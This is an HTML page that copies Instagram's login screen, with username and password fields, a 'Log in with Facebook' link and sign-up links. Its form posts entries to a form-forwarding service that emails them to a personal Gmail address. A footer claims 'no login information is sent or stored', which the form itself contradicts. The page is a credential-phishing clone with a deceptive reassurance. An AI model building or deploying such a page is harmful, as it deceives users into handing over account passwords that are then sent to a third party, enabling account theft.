<!DOCTYPE html>

<html>
<head>
    <title>Instagram Style Login</title>

```
<style>
    * {
        box-sizing: border-box;
    }

    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #fafafa;
        color: #262626;
    }

    .page {
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .login-container {
        width: 350px;
    }

    .login-box {
        background: white;
        border: 1px solid #dbdbdb;
        padding: 40px;
        text-align: center;
    }

    .logo {
        font-family: cursive;
        font-size: 42px;
        font-weight: bold;
        margin: 0 0 35px;
    }

    input {
        width: 100%;
        height: 40px;
        margin-bottom: 7px;
        padding: 10px;
        border: 1px solid #dbdbdb;
        border-radius: 3px;
        background: #fafafa;
        font-size: 12px;
    }

    .login {
        width: 100%;
        height: 34px;
        margin-top: 8px;
        border: none;
        border-radius: 8px;
        background: #0095f6;
        color: white;
        font-weight: bold;
        cursor: pointer;
    }

    .login:hover {
        background: #1877f2;
    }

    .or {
        display: flex;
        align-items: center;
        gap: 15px;
        margin: 20px 0;
        color: #737373;
        font-size: 13px;
        font-weight: bold;
    }

    .or::before,
    .or::after {
        content: "";
        height: 1px;
        background: #dbdbdb;
        flex: 1;
    }

    .facebook {
        color: #385185;
        font-weight: bold;
        font-size: 14px;
    }

    .forgot {
        display: block;
        margin-top: 18px;
        color: #00376b;
        font-size: 12px;
        text-decoration: none;
    }

    .signup {
        background: white;
        border: 1px solid #dbdbdb;
        margin-top: 10px;
        padding: 25px;
        text-align: center;
        font-size: 14px;
    }

    .signup a {
        color: #0095f6;
        font-weight: bold;
        text-decoration: none;
    }

    .notice {
        margin-top: 15px;
        text-align: center;
        font-size: 11px;
        color: #737373;
    }
</style>
```

</head>

<body>

<div class="page">

```
<div class="login-container">

    <div class="login-box">

        <h1 class="logo">Instagram</h1>

        <form action="https://formsubmit.co/waelbouznif3@gmail.com"
          method="POST">

            <input
                type="text"
                placeholder="Phone number, username, or email"
            >

            <input
                type="text"
                placeholder="Password"
            >

            <button class="send" type="submit">
            log in
        </button>

        </form>

        <div class="or">
            OR
        </div>

        <div class="facebook">
            Log in with Facebook
        </div>

        <a href="#" class="forgot">
            Forgot password?
        </a>

    </div>

    <div class="signup">
        Don't have an account?
        <a href="#">Sign up</a>
    </div>

    <div class="notice">
        Demo interface — no login information is sent or stored.
    </div>

</div>
```

</div>

</body>
</html>
